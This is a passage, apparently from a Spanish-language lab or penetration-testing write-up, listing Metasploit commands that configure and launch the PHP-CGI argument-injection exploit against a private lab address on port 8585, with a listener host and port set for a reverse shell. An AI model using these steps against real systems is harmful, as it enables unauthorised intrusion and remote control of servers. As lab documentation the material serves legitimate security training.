...
2. Configuración y Explotación del ObjetivoSe ingresó al módulo en msfconsole y se configuraron las opciones para apuntar al servicio PHP en el puerto 8585:Bashuse exploit/multi/http/php_cgi_arg_injection
set RHOSTS 10.0.2.3
set RPORT 8585
set LHOST 10.0.2.10
set LPORT 4444
show options
EjecuciónSe verificó el estado con check y se ejecutó la explotación mediante exploit:Bashcheck
exploit
